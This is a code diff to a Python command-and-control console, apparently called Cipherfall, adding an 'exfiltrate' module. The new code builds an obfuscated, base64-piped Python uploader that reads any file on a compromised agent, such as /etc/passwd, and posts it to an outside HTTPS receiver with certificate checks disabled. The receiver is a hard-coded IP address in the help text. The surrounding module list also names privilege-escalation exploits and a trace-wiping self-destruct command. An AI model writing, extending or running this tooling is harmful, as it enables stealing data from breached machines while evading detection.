@@ -39,11 +39,13 @@ _ports       = os.environ.get("C2_ADMIN_PORTS",
                    os.environ.get("C2_ADMIN_PORT", "1338,1337")).split(",")
 BASES        = [f"http://127.0.0.1:{p.strip()}" for p in _ports if p.strip()]
 BASE         = BASES[0]
-_DEFAULT_URL = os.environ.get("WORKER_URL", "").rstrip("/")
-_C2_HOST     = os.environ.get("C2_HOST", "0.0.0.0")
-_DEFAULT_PSK = os.environ.get("C2_PSK", "")
-TASK_COLORS  = {"done": "green", "sent": "yellow", "pending": "red"}
-HERE         = pathlib.Path(__file__).parent
+_DEFAULT_URL   = os.environ.get("WORKER_URL", "").rstrip("/")
+_C2_HOST       = os.environ.get("C2_HOST", "0.0.0.0")
+_DEFAULT_PSK   = os.environ.get("C2_PSK", "")
+_EXFIL_ENDPOINT = os.environ.get("EXFIL_ENDPOINT", "").rstrip("/")
+_EXFIL_TOKEN    = os.environ.get("EXFIL_TOKEN", "")
+TASK_COLORS    = {"done": "green", "sent": "yellow", "pending": "red"}
+HERE           = pathlib.Path(__file__).parent
 
 
 def _ts(epoch: int) -> str:
@@ -197,6 +199,83 @@ def _url_host(url: str) -> str:
         return url.split("://", 1)[1].rsplit(":", 1)[0]
     except Exception:
         return ""
+
+
+def _normalize_exfil_endpoint(value: str) -> str:
+    value = value.strip()
+    if "://" not in value:
+        value = "https://" + value
+    from urllib.parse import urlsplit, urlunsplit
+    parsed = urlsplit(value)
+    if parsed.scheme != "https" or not parsed.hostname:
+        raise ValueError("endpoint must be an HTTPS host")
+    if parsed.port is None:
+        netloc = parsed.hostname if parsed.username is None else parsed.netloc
+        if ":" in parsed.hostname and not parsed.hostname.startswith("["):
+            netloc = "[%s]" % parsed.hostname
+        netloc += ":8443"
+    else:
+        netloc = parsed.netloc
+    path = parsed.path or "/receiver/"
+    return urlunsplit(("https", netloc, path, "", ""))
+
+
+def _build_exfil_cmd(remote_path: str, endpoint: str, token: str) -> str:
+    """Return a shell command that runs a stdlib-only Python uploader on the agent."""
+    endpoint = _normalize_exfil_endpoint(endpoint)
+    py = '''
+import base64, hashlib, mimetypes, os, ssl, sys, uuid
+from pathlib import Path
+from urllib.error import HTTPError, URLError
+from urllib.parse import urlsplit, urlunsplit
+from urllib.request import Request, urlopen
+
+remote = {remote!r}
+endpoint = {endpoint!r}
+token = {token!r}
+
+p = Path(remote)
+if not p.is_file():
+    print("exfil: file not found: " + remote)
+    sys.exit(1)
+
+data = p.read_bytes()
+boundary = "----CipherfallExfil" + uuid.uuid4().hex
+ct = mimetypes.guess_type(p.name)[0] or "application/octet-stream"
+filename = p.name.encode("utf-8")
+body = (
+    b"--" + boundary.encode() + b"\\r\\n"
+    b'Content-Disposition: form-data; name="file"; filename="' + filename + b'"\\r\\n'
+    b"Content-Type: " + ct.encode() + b"\\r\\n\\r\\n"
+    + data
+    + b"\\r\\n--" + boundary.encode() + b"--\\r\\n"
+)
+digest = hashlib.sha256(data).hexdigest()
+req = Request(
+    endpoint,
+    data=body,
+    method="POST",
+    headers={{
+        "Content-Type": "multipart/form-data; boundary=" + boundary,
+        "Content-Length": str(len(body)),
+        "X-Lab-Upload-Token": token,
+        "X-File-SHA256": digest,
+    }},
+)
+ctx = ssl._create_unverified_context()
+try:
+    with urlopen(req, context=ctx, timeout=30) as r:
+        print("exfil: uploaded %s (%d bytes) -> %s" % (p.name, len(data), r.read().decode().strip()))
+except HTTPError as e:
+    msgs = {{401: "invalid token", 404: "endpoint not found", 413: "file too large", 409: "duplicate"}}
+    print("exfil: HTTP %d: %s" % (e.code, msgs.get(e.code, e.reason)))
+except URLError as e:
+    print("exfil: connection failed: " + str(e.reason))
+except Exception as e:
+    print("exfil: error: " + str(e))
+'''.format(remote=remote_path, endpoint=endpoint, token=token)
+    b64 = base64.b64encode(py.encode()).decode()
+    return f"printf '%s' '{b64}' | base64 -d | python3 -"
 
 
 def _build_graph(agents: list, worker_url: str, admin_port: str, c2_host: str = "127.0.0.1") -> Text:
@@ -866,6 +945,24 @@ _MODULE_DOCS: "dict[str, tuple[str, str]]" = {
   and the full output.
   Example: /module save /tmp/session.log""",
     ),
+    "exfiltrate": (
+        "upload a remote file from the agent to an HTTPS receiver",
+        """/module exfiltrate <remote_path> [endpoint] [token]
+
+  Read remote_path on the selected agent and upload it over HTTPS
+  to the exfiltration receiver. The agent runs a stdlib-only Python
+  client inline; no external dependencies required on target.
+
+  remote_path  file to read on the agent (required)
+  endpoint     HTTPS receiver URL, e.g. 87.106.187.97:8443/receiver/
+               Port defaults to 8443 if omitted. Defaults to EXFIL_ENDPOINT.
+  token        shared upload token. Defaults to EXFIL_TOKEN.
+
+  The receiver stores files in its --output-dir and rejects duplicates
+  by SHA-256. Result printed in the output log shows stored filename
+  or the HTTP error.
+  Example: /module exfiltrate /etc/passwd 87.106.187.97:8443/receiver/ s3cr3t""",
+    ),
     "suicide": (
         "self-destruct agent and wipe traces on target",
         """/module suicide
@@ -936,6 +1033,8 @@ _COMPLETIONS: list[str] = [
     "/module privesc ssh-keysign",
     "/module privesc fragnesia",
     "/module privesc fragnesia-dirtyfrag",
+    "/module exfiltrate ",
+    "/module exfiltrate /etc/passwd",
     "/module save",
     "/module save ",
     "/module suicide",
@@ -949,6 +1048,7 @@ _COMPLETIONS: list[str] = [
     "/module help upload",
     "/module help download",
     "/module help save",
+    "/module help exfiltrate",
     "/module help suicide",
 ]
 
@@ -1897,6 +1997,29 @@ class CipherfallTUI(App):
             log.write(f"[yellow]privesc ({exploit}) dispatched — tag {tag}[/yellow]")
             await self._load_tasks(agent_id)
             return
+        elif cmd.startswith("/module exfiltrate"):
+            parts = cmd.split(None, 4)
+            if len(parts) < 3:
+                log.clear()
+                log.write("[red]usage: /module exfiltrate <remote_path> [endpoint] [token][/red]")
+                return
+            remote_path = parts[2]
+            endpoint = parts[3] if len(parts) > 3 else _EXFIL_ENDPOINT
+            token = parts[4] if len(parts) > 4 else _EXFIL_TOKEN
+            if not endpoint:
+                log.clear()
+                log.write("[red]no endpoint — set EXFIL_ENDPOINT in .env or pass it as argument[/red]")
+                return
+            if not token:
+                log.clear()
+                log.write("[red]no token — set EXFIL_TOKEN in .env or pass it as argument[/red]")
+                return
+            try:
+                cmd = _build_exfil_cmd(remote_path, endpoint, token)
+            except ValueError as e:
+                log.clear()
+                log.write(f"[red]bad endpoint: {e}[/red]")
+                return
         elif cmd.startswith("/module save"):
             parts    = cmd.split(None, 2)
             agent_id = self._selected_agent
